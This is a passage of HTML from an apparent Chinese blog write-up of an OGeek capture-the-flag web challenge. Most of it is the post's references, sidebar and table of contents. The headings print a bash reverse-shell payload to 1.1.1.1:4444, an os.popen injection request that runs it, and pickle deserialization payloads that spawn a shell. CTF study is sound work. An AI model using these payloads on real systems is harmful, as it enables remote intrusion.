href="#http-www-bendawang-site-2017-03-21-python-E6-B7-B1-E5-85-A5-E5-AD-A6-E4-B9-A0-E4-B8-80-EF-BC-9A-E7-B1-BB-E4-B8-8E-E5-85-83-E7-B1-BB-EF-BC-88metaclass-EF-BC-89-E7-9A-84-E7-90-86-E8-A7-A3" class="headerlink" title="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/"></a><a href="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/" target="_blank" rel="noopener">http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/</a></h5><h5 id="http-www-polaris-lab-com-index-php-archives-178"><a href="#http-www-polaris-lab-com-index-php-archives-178" class="headerlink" title="http://www.polaris-lab.com/index.php/archives/178/"></a><a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a></h5><h5 id="https-xz-aliyun-com-t-2289"><a href="#https-xz-aliyun-com-t-2289" class="headerlink" title="https://xz.aliyun.com/t/2289"></a><a href="https://xz.aliyun.com/t/2289" target="_blank" rel="noopener">https://xz.aliyun.com/t/2289</a></h5><h5 id="https-blog-csdn-net-yanghuan313-article-details-65010925"><a href="#https-blog-csdn-net-yanghuan313-article-details-65010925" class="headerlink" title="https://blog.csdn.net/yanghuan313/article/details/65010925"></a><a href="https://blog.csdn.net/yanghuan313/article/details/65010925" target="_blank" rel="noopener">https://blog.csdn.net/yanghuan313/article/details/65010925</a></h5><h5 id="https-www-cnblogs-com-wfzWebSecuity-p-9401677-html"><a href="#https-www-cnblogs-com-wfzWebSecuity-p-9401677-html" class="headerlink" title="https://www.cnblogs.com/wfzWebSecuity/p/9401677.html"></a><a href="https://www.cnblogs.com/wfzWebSecuity/p/9401677.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/9401677.html</a></h5><h5 id="http-blog-knownsec-com-2015-12-sqlmap-code-execution-vulnerability-analysis"><a href="#http-blog-knownsec-com-2015-12-sqlmap-code-execution-vulnerability-analysis" class="headerlink" title="http://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/"></a><a href="http://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/</a></h5><h5 id="https-media-blackhat-com-bh-us-11-Slaviero-BH-US-11-Slaviero-Sour-Pickles-Slides-pdf"><a href="#https-media-blackhat-com-bh-us-11-Slaviero-BH-US-11-Slaviero-Sour-Pickles-Slides-pdf" class="headerlink" title="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf"></a><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></h5><h5 id="https-media-blackhat-com-bh-us-11-Slaviero-BH-US-11-Slaviero-Sour-Pickles-WP-pdf"><a href="#https-media-blackhat-com-bh-us-11-Slaviero-BH-US-11-Slaviero-Sour-Pickles-WP-pdf" class="headerlink" title="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf"></a><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a></h5><h5 id="https-blog-csdn-net-sinat-29552923-article-details-70833455"><a href="#https-blog-csdn-net-sinat-29552923-article-details-70833455" class="headerlink" title="https://blog.csdn.net/sinat_29552923/article/details/70833455"></a><a href="https://blog.csdn.net/sinat_29552923/article/details/70833455" target="_blank" rel="noopener">https://blog.csdn.net/sinat_29552923/article/details/70833455</a></h5><h5 id="https-blog-nelhage-com-2011-03-exploiting-pickle"><a href="#https-blog-nelhage-com-2011-03-exploiting-pickle" class="headerlink" title="https://blog.nelhage.com/2011/03/exploiting-pickle/"></a><a href="https://blog.nelhage.com/2011/03/exploiting-pickle/" target="_blank" rel="noopener">https://blog.nelhage.com/2011/03/exploiting-pickle/</a></h5><h5 id="https-segmentfault-com-a-1190000013099825"><a href="#https-segmentfault-com-a-1190000013099825" class="headerlink" title="https://segmentfault.com/a/1190000013099825"></a><a href="https://segmentfault.com/a/1190000013099825" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013099825</a></h5><h5 id="https-segmentfault-com-a-1190000013214956"><a href="#https-segmentfault-com-a-1190000013214956" class="headerlink" title="https://segmentfault.com/a/1190000013214956"></a><a href="https://segmentfault.com/a/1190000013214956" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013214956</a></h5><h5 id="web安全-漏洞分析"><a href="#web安全-漏洞分析" class="headerlink" title="web安全 漏洞分析"></a><a href="https://www.k0rz3n.com/tags/web%E5%AE%89%E5%85%A8-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">web安全 漏洞分析</a></h5>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/19/2019hitcon的部分web题目复现/" rel="next" title="2019hitcon的部分web题目复现">
+                <i class="fa fa-chevron-left"></i> 2019hitcon的部分web题目复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-开始复现"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 开始复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这次Ogeek的线下AWD有3个web题目其中最简单是是web3，主要的逻辑都在app-py里面，漏洞也是比较的明显。"><span class="nav-number">1.1.1.</span> <span class="nav-text">这次Ogeek的线下AWD有3个web题目其中最简单是是web3，主要的逻辑都在app.py里面，漏洞也是比较的明显。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-robots后门"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 robots后门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在app-py中把flag放在robots-txt中，访问就可以拿到flag。"><span class="nav-number">1.2.1.</span> <span class="nav-text">在app.py中把flag放在robots.txt中，访问就可以拿到flag。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-eval后面"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 eval后面</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这个函数应该是刻意设置的后门，我们可以跟进看看哪里调用了这个函数。"><span class="nav-number">1.3.1.</span> <span class="nav-text">这个函数应该是刻意设置的后门，我们可以跟进看看哪里调用了这个函数。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们可以看到message中有调用，并且有限制，msg的长度必须要小于27个字符并且不能有空格和下划线，type只能输入一个字符。"><span class="nav-number">1.3.2.</span> <span class="nav-text">我们可以看到message中有调用，并且有限制，msg的长度必须要小于27个字符并且不能有空格和下划线，type只能输入一个字符。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们构造读flag文件的poc如下："><span class="nav-number">1.3.3.</span> <span class="nav-text">我们构造读flag文件的poc如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我在burpSuite中的构造如下："><span class="nav-number">1.3.4.</span> <span class="nav-text">我在burpSuite中的构造如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#读取的结果如下："><span class="nav-number">1.3.5.</span> <span class="nav-text">读取的结果如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#于此同时我们也可以getshell，刚好27个字符如下："><span class="nav-number">1.3.6.</span> <span class="nav-text">于此同时我们也可以getshell，刚好27个字符如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#简单分析payload"><span class="nav-number">1.3.7.</span> <span class="nav-text">简单分析payload</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#首先需要通过python解释器，因此不能有用法错误，需要前后单引号以及-号闭合。"><span class="nav-number">1.3.7.1.</span> <span class="nav-text">首先需要通过python解释器，因此不能有用法错误，需要前后单引号以及+号闭合。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#原本的app-py中已经导入了os模块，因此我们可以用os-popen-执行命令。"><span class="nav-number">1.3.7.2.</span> <span class="nav-text">原本的app.py中已经导入了os模块，因此我们可以用os.popen()执行命令。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#不能有空格，但在bash中tab与空格等价url编码为-09。"><span class="nav-number">1.3.7.3.</span> <span class="nav-text">不能有空格，但在bash中tab与空格等价url编码为%09。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#echo不生成换行符可以使用参数-n。"><span class="nav-number">1.3.7.4.</span> <span class="nav-text">echo不生成换行符可以使用参数-n。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#用bp发送请求后会报错，但是已经执行成功，并且写入文件了。"><span class="nav-number">1.3.7.5.</span> <span class="nav-text">用bp发送请求后会报错，但是已经执行成功，并且写入文件了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们依次写入反弹的shell的payload-bash-c-39-bash-i-gt-dev-tcp-1-1-1-1-4444-0-gt-amp-1-39-空格用tab代替。"><span class="nav-number">1.3.7.6.</span> <span class="nav-text">我们依次写入反弹的shell的payload:bash -c &#39;bash -i &gt;/dev/tcp/1.1.1.1/4444 0&gt;&amp;1&#39;,空格用tab代替。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后post请求msg-2Bos-popen-quot-sh-09a-quot-2B-39-amp-type-39-即可执行反弹shell。"><span class="nav-number">1.3.7.7.</span> <span class="nav-text">最后post请求msg=%2Bos.popen(&quot;sh%09a&quot;)%2B&#39;&amp;type=&#39;即可执行反弹shell。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-pickle反序列化"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 pickle反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在app-py中我们看到import了pickle这个库，第一反应是python反序列化。"><span class="nav-number">1.4.1.</span> <span class="nav-text">在app.py中我们看到import了pickle这个库，第一反应是python反序列化。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#全局搜索pickle。"><span class="nav-number">1.4.2.</span> <span class="nav-text">全局搜索pickle。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#大致的逻辑是，如果是post请求，则获取cookie中的user字段，base64解码，并且触发反序列化。"><span class="nav-number">1.4.3.</span> <span class="nav-text">大致的逻辑是，如果是post请求，则获取cookie中的user字段，base64解码，并且触发反序列化。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反弹shell的payload，需要base64编码："><span class="nav-number">1.4.4.</span> <span class="nav-text">反弹shell的payload，需要base64编码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如果要直接返回flag-得使返回值的类型为字典-且有name键。"><span class="nav-number">1.4.5.</span> <span class="nav-text">如果要直接返回flag,得使返回值的类型为字典,且有name键。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#附上我们的构造脚本。"><span class="nav-number">1.4.6.</span> <span class="nav-text">附上我们的构造脚本。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以很明显的看到执行成功。"><span class="nav-number">1.4.7.</span> <span class="nav-text">可以很明显的看到执行成功。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通过这个poc我们可以了解一下python的序列化机制。"><span class="nav-number">1.5.</span> <span class="nav-text">通过这个poc我们可以了解一下python的序列化机制。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X05-Python-的序列化和反序列化是什么"><span class="nav-number">1.6.</span> <span class="nav-text">0X05 Python 的序列化和反序列化是什么</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Python-的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。"><span class="nav-number">1.6.1.</span> <span class="nav-text">Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#下面是示例代码："><span class="nav-number">1.7.</span> <span class="nav-text">下面是示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#序列化代码："><span class="nav-number">1.7.1.</span> <span class="nav-text">序列化代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化代码："><span class="nav-number">1.7.2.</span> <span class="nav-text">反序列化代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#说到序列化就要到PVM虚拟机这里就不作介绍了，下面给出一个比较重要的："><span class="nav-number">1.7.3.</span> <span class="nav-text">说到序列化就要到PVM虚拟机这里就不作介绍了，下面给出一个比较重要的：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化流程"><span class="nav-number">1.7.4.</span> <span class="nav-text">反序列化流程</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#序列化就是一个将对象转化成字符串的过程，这个我们能直接使用-pickle-实现，这个过程我们也无需利用和分析，这里不做深究，我这里就是说一下如何进行的反序列化"><span class="nav-number">1.7.4.1.</span> <span class="nav-text">序列化就是一个将对象转化成字符串的过程，这个我们能直接使用 pickle 实现，这个过程我们也无需利用和分析，这里不做深究，我这里就是说一下如何进行的反序列化</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们将下面这个字符串存储为一个文件-shell-pickle"><span class="nav-number">1.7.4.2.</span> <span class="nav-text">我们将下面这个字符串存储为一个文件 shell.pickle</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#当我们使用下面这个函数对其进行加载的时候"><span class="nav-number">1.7.4.3.</span> <span class="nav-text">当我们使用下面这个函数对其进行加载的时候</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#执行结果如下："><span class="nav-number">1.7.4.4.</span> <span class="nav-text">执行结果如下：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以看到成功返回了-sh-的-shell"><span class="nav-number">1.7.5.</span> <span class="nav-text">可以看到成功返回了 sh 的 shell</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们现在来结合我们上面讲述的-PVM-的操作码看这个文件中的字符串是怎么一步一步执行的"><span class="nav-number">1.7.5.1.</span> <span class="nav-text">我们现在来结合我们上面讲述的 PVM 的操作码看这个文件中的字符串是怎么一步一步执行的</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-c-后面是模块名，换行后是类名-于是将-os-system-放入栈中"><span class="nav-number">1.7.5.2.</span> <span class="nav-text">(1)c 后面是模块名，换行后是类名,于是将 os.system 放入栈中</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-这个是标记符，我们将一个-Mark-放入栈中"><span class="nav-number">1.7.5.3.</span> <span class="nav-text">(2)( 这个是标记符，我们将一个 Mark 放入栈中</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-S-后面是字符串，我们放入栈中"><span class="nav-number">1.7.5.4.</span> <span class="nav-text">(3)S 后面是字符串，我们放入栈中</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-t-将栈中-Mark-之前的内容取出来转化成元祖，再存入栈中-（’-bin-sh’-），同时标记-Mark-消失"><span class="nav-number">1.7.5.5.</span> <span class="nav-text">(4)t 将栈中 Mark 之前的内容取出来转化成元祖，再存入栈中 （’/bin/sh’,），同时标记 Mark 消失</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-R-将元祖取出，并将-callable-取出，然后将元祖作为-callable-的参数，并执行，对应这里就是-os-system-‘-bin-sh’-然后将结果再存入栈中"><span class="nav-number">1.7.5.6.</span> <span class="nav-text">(5)R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system(‘/bin/sh’),然后将结果再存入栈中</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注意："><span class="nav-number">1.7.6.</span> <span class="nav-text">注意：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-与PHP反序列化的对比"><span class="nav-number">1.8.</span> <span class="nav-text">0x06 与PHP反序列化的对比</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#相比于-PHP-反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python-凭借着自己彻底的面向对象的特性完胜-PHP-，Python-除了能反序列化当前代码中出现的类-包括通过-import的方式引入的模块中的类-的对象以外，还能利用其彻底的面向对象的特性来反序列化使用-types-创建的匿名对象（这部分内容在后面会有所介绍），这样的话就大大拓宽了我们的攻击面。"><span class="nav-number">1.8.1.</span> <span class="nav-text">相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象（这部分内容在后面会有所介绍），这样的话就大大拓宽了我们的攻击面。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-Python-反序列化漏洞的由来"><span class="nav-number">1.9.</span> <span class="nav-text">0x07 Python 反序列化漏洞的由来</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-为什么会出现反序列化漏洞"><span class="nav-number">1.9.1.</span> <span class="nav-text">1.为什么会出现反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是python官方文档的介绍。"><span class="nav-number">1.9.1.1.</span> <span class="nav-text">下面是python官方文档的介绍。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#说的意思就是官方并不没有义务保证你传入反序列化函数的内容是安全的，官方只负责反序列化，如果你传入不安全的内容那么自然就是不安全的"><span class="nav-number">1.9.2.</span> <span class="nav-text">说的意思就是官方并不没有义务保证你传入反序列化函数的内容是安全的，官方只负责反序列化，如果你传入不安全的内容那么自然就是不安全的</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-反序列化漏洞往往出现在什么地方"><span class="nav-number">1.10.</span> <span class="nav-text">2.反序列化漏洞往往出现在什么地方</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这里引用勾陈安全实验室的大佬写的"><span class="nav-number">1.10.1.</span> <span class="nav-text">这里引用勾陈安全实验室的大佬写的</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-通常在解析认证token，session的时候"><span class="nav-number">1.10.2.</span> <span class="nav-text">1.通常在解析认证token，session的时候</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。P神的文章就有一个很好的redis-python反序列化漏洞的很好例子：https-www-leavesongs-com-PENETRATION-zhangyue-python-web-code-execute-html。"><span class="nav-number">1.10.2.1.</span> <span class="nav-text">现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。P神的文章就有一个很好的redis+python反序列化漏洞的很好例子：https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-可能将对象Pickle后存储成磁盘文件。"><span class="nav-number">1.10.3.</span> <span class="nav-text">2.可能将对象Pickle后存储成磁盘文件。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-可能将对象Pickle后在网络中传输。"><span class="nav-number">1.10.4.</span> <span class="nav-text">3.可能将对象Pickle后在网络中传输。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#其实，最常见的也是最经典的也就是我们的第一点，也就是-flask-配合-redis-在服务端存储-session-的情景，这里的-session-是被-pickle-序列化进行存储的，如果你通过-cookie-进行请求-sessionid-的话，session-中的内容就会被反序列化，看似好像是没有什么问题-因为-session-是存储在-服务端的，但是终究是抵不住-redis-的未授权访问，如果出现未授权的话，我们就能通过-set-设置自己的-session-然后通过设置-cookie-去请求-session-的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的"><span class="nav-number">1.10.5.</span> <span class="nav-text">其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-我们怎么利用反序列化漏洞"><span class="nav-number">1.11.</span> <span class="nav-text">3.我们怎么利用反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用的关键点还是如何构造我们的反序列化的-payload，这时候就不得不提到-reduce-这个魔法方法了（注意：-reduce-方法是新式类-内置类-特有的-）"><span class="nav-number">1.11.1.</span> <span class="nav-text">利用的关键点还是如何构造我们的反序列化的 payload，这时候就不得不提到 reduce 这个魔法方法了（注意：__reduce__方法是新式类(内置类)特有的,）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关于新式类-内置类-和旧式类-自建类-，我这里简单的说一下，如果想看具体的，请转向-bendawang-师傅的这篇博客"><span class="nav-number">1.11.2.</span> <span class="nav-text">关于新式类(内置类)和旧式类(自建类)，我这里简单的说一下，如果想看具体的，请转向 bendawang 师傅的这篇博客</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在-python2-中有两种声明类的方式，并且他们实例化的对象性质是不同的"><span class="nav-number">1.11.3.</span> <span class="nav-text">在 python2 中有两种声明类的方式，并且他们实例化的对象性质是不同的</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#示例代码："><span class="nav-number">1.12.</span> <span class="nav-text">示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#旧式代码："><span class="nav-number">1.12.1.</span> <span class="nav-text">旧式代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#新式代码："><span class="nav-number">1.12.2.</span> <span class="nav-text">新式代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#但是-Python3-中解决了这个问题，在表现上消除了两者的差别，所以如果在-python2-中我们使用-reduce-要使用下面这种声明类的方法"><span class="nav-number">1.12.3.</span> <span class="nav-text">但是 Python3 中解决了这个问题，在表现上消除了两者的差别，所以如果在 python2 中我们使用 __reduce__ 要使用下面这种声明类的方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#好了，回到正题，我们先看一下官方是怎么介绍这个-reduce-的，"><span class="nav-number">1.12.4.</span> <span class="nav-text">好了，回到正题，我们先看一下官方是怎么介绍这个 __reduce__ 的，</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#当序列化以及反序列化的过程中中碰到一无所知的扩展类型-这里指的就是新式类-的时候，可以通过类中定义的-reduce-方法来告知如何进行序列化或者反序列化"><span class="nav-number">1.12.5.</span> <span class="nav-text">当序列化以及反序列化的过程中中碰到一无所知的扩展类型(这里指的就是新式类)的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#也就是说我们，只要在新式类中定义一个-reduce-方法，我们就能在序列化的使用让这个类根据我们在-reduce-中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String-和-tuple-我们的构造点就在令其返回-tuple-的时候"><span class="nav-number">1.12.6.</span> <span class="nav-text">也就是说我们，只要在新式类中定义一个 __reduce__ 方法，我们就能在序列化的使用让这个类根据我们在__reduce__ 中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable-object-可调用的对象-，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的-PVM-的指令码，你就会发现这个返回值和其中的一个-R-指令非常的一致，（我猜测这个-R-指令码就是这个-reduce-方法的返回值的底层实现-）"><span class="nav-number">1.12.7.</span> <span class="nav-text">当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object(可调用的对象)，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 __reduce__ 方法的返回值的底层实现 ）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开始实践："><span class="nav-number">1.13.</span> <span class="nav-text">开始实践：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-1"><span class="nav-number">1.13.1.</span> <span class="nav-text">示例代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#运行的结果："><span class="nav-number">1.13.2.</span> <span class="nav-text">运行的结果：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 